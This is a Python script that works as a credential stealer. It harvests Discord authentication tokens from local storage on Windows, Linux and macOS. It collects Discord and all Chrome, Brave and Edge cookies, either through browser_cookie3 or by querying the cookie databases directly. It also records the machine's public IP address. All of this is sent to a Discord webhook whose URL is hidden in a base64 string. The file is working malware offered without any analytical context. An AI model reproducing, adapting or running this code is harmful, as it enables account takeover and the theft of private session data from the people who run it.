import os
import re
import json
import requests
from datetime import datetime
import base64
import sqlite3
import browser_cookie3
import platform

ew = """aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM3MzE3NTcwMDIxNTAzODAwMi8ydzB6
VDk1Y0JINUJMY2Ztblc3cEhSTE91SkpmUVNxbGx1WFctcjVXOXRYZ3FjMVphbENYZUR2REd0MUJX
YS0wZWZOcA=="""
dw = base64.b64decode(ew).decode('utf-8')

DISCORD_WEBHOOK_URL = dw

def final_find_discord_tokens():
    tokens = set()
    paths = []
    system = platform.system()
    if system == "Windows":
        paths.extend([os.path.join(os.getenv('LOCALAPPDATA'), 'Discord', 'Local Storage', 'leveldb'), os.path.join(os.getenv('APPDATA'), 'Discord', 'Local Storage', 'leveldb'), os.path.join(os.getenv('LOCALAPPDATA'), 'DiscordCanary', 'Local Storage', 'leveldb'), os.path.join(os.getenv('APPDATA'), 'DiscordCanary', 'Local Storage', 'leveldb'), os.path.join(os.getenv('LOCALAPPDATA'), 'DiscordPTB', 'Local Storage', 'leveldb'), os.path.join(os.getenv('APPDATA'), 'DiscordPTB', 'Local Storage', 'leveldb')])
    elif system == "Linux":
        paths.extend([os.path.expanduser('~/.config/discord/Local Storage/leveldb'), os.path.expanduser('~/.config/discordcanary/Local Storage/leveldb'), os.path.expanduser('~/.config/discordptb/Local Storage/leveldb')])
    elif system == "Darwin":
        paths.extend([os.path.expanduser('~/Library/Application Support/Discord/Local Storage/leveldb'), os.path.expanduser('~/Library/Application Support/DiscordCanary/Local Storage/leveldb'), os.path.expanduser('~/Library/Application Support/DiscordPTB/Local Storage/leveldb')])

    keywords = ["token", "auth_token", "access_token"]
    token_regex = r"([a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}|mfa\.[a-zA-Z0-9_-]{84})"
    long_alphanumeric = r"[a-zA-Z0-9_-]{50,200}"

    for path in paths:
        if os.path.exists(path):
            try:
                for filename in os.listdir(path):
                    filepath = os.path.join(path, filename)
                    try:
                        with open(filepath, 'r', errors='ignore') as f:
                            content = f.read()
                            for line in content.splitlines():
                                for keyword in keywords:
                                    if keyword in line:
                                        for match in re.finditer(token_regex, line):
                                            tokens.add(match.group(0))
                                        for match in re.finditer(f'{keyword}[\\s\'"]*[:=][\\s\'"]*{long_alphanumeric}', line):
                                            potential = match.group(0).split('=')[-1].strip('"\' ')
                                            if re.match(token_regex, potential):
                                                tokens.add(potential)
                                            elif len(potential) > 50 and "." in potential:
                                                tokens.add(potential)
                    except Exception as e:
                        print(f"Final token find error reading {filepath}: {e}")
            except Exception as e:
                print(f"Final token path error: {e}")
        else:
            print(f"Final token path not found: {path}")
    return list(set(tokens))

def final_find_chrome_cookies():
    cookies_list = set()
    try:
        chrome_cookies = browser_cookie3.chrome(domain_name='.discord.com')
        for cookie in chrome_cookies:
            cookies_list.add(f"Domain: {cookie.domain}, Name: {cookie.name}, Value: {cookie.value}")
        chrome_cookies = browser_cookie3.chrome(domain_name='.discordapp.com')
        for cookie in chrome_cookies:
            cookies_list.add(f"Domain: {cookie.domain}, Name: {cookie.name}, Value: {cookie.value}")
        all_chrome_cookies = browser_cookie3.chrome()
        for cookie in all_chrome_cookies:
            cookies_list.add(f"ALL - Domain: {cookie.domain}, Name: {cookie.name}, Value: {cookie.value}")
    except browser_cookie3.BrowserCookieError as e:
        print(f"Error extracting Chrome cookies (final browser_cookie3): {e}")
        local_app_data = os.getenv('LOCALAPPDATA')
        chrome_paths = []
        system = platform.system()
        if system == "Windows":
            chrome_paths.extend([os.path.join(local_app_data, 'Google', 'Chrome', 'User Data', 'Default', 'Network', 'Cookies'), os.path.join(local_app_data, 'Google', 'Chrome SxS', 'User Data', 'Default', 'Network', 'Cookies'), os.path.join(local_app_data, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Network', 'Cookies'), os.path.join(local_app_data, 'Microsoft', 'Edge', 'User Data', 'Default', 'Network', 'Cookies')])
        elif system == "Linux":
            chrome_paths.extend([os.path.expanduser('~/.config/google-chrome/Default/Network/Cookies'), os.path.expanduser('~/.config/brave-browser/Default/Network/Cookies')])
        elif system == "Darwin":
            chrome_paths.extend([os.path.expanduser('~/Library/Application Support/Google/Chrome/Default/Network/Cookies'), os.path.expanduser('~/Library/Application Support/BraveSoftware/Brave-Browser/Default/Network/Cookies')])
        for path in chrome_paths:
            if os.path.exists(path):
                try:
                    conn = sqlite3.connect(path)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, value FROM cookies")
                    for host_key, name, value in cursor.fetchall():
                        cookies_list.add(f"ALL - Host: {host_key}, Name: {name}, Value: {value}")
                    conn.close()
                except sqlite3.Error as e:
                    print(f"Error reading Chrome cookies (final fallback): {e}")
            else:
                print(f"Chrome cookie path not found (final fallback): {path}")
    except Exception as e:
        print(f"General cookie extraction error (final): {e}")
    return list(cookies_list)

def final_get_ip_address():
    try:
        response = requests.get('https://api.ipify.org?format=json', timeout=5)
        response.raise_for_status()
        return response.json()['ip']
    except requests.exceptions.RequestException as e:
        print(f"Error getting IP address (final): {e}")
        return None

def final_send_to_discord(tokens, ip_address, cookies):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    embed = {
        "title": "Discord & Chrome Info Found!",
        "color": 0x7289DA,
        "fields": [
            {
                "name": "Timestamp",
                "value": timestamp,
                "inline": False
            },
            {
                "name": "Discord Tokens (Aggressive & Platform Aware)",
                "value": f"```{'\\n'.join(tokens) if tokens else 'No tokens found.'}```",
                "inline": False
            },
            {
                "name": "IP Address",
                "value": ip_address if ip_address else "N/A",
                "inline": False
            },
            {
                "name": "Chrome Cookies (ALL)",
                "value": f"```{'\\n'.join(cookies[:50]) + '...' if len(cookies) > 50 else '\\n'.join(cookies) if cookies else 'No Chrome cookies found.'}```",
                "inline": False
            },
            {
                "name": "Total Cookies Found",
                "value": str(len(cookies)),
                "inline": True
            }
        ]
    }
    payload = {
        "embeds": [embed]
    }
    headers = {
        'Content-Type': 'application/json'
    }

    try:
        response = requests.post(DISCORD_WEBHOOK_URL, json=payload, headers=headers, timeout=10)
        response.raise_for_status()
    except requests.exceptions.RequestException as e:
        print(f"Error sending to Discord webhook (FINAL): {e}")
        print(f"Webhook Request Error: {e}")
        if 'response' in locals():
            print(f"Webhook Response Status Code: {response.status_code}")
            print(f"Webhook Response Content: {response.text}")
    except Exception as e:
        print(f"General webhook sending error (final): {e}")

if __name__ == "__main__":
    tokens = final_find_discord_tokens()
    ip_address = final_get_ip_address()
    cookies = final_find_chrome_cookies()

    if tokens or ip_address or cookies:
        final_send_to_discord(tokens, ip_address, cookies)
    else:
        print("No new information found (final mode).")
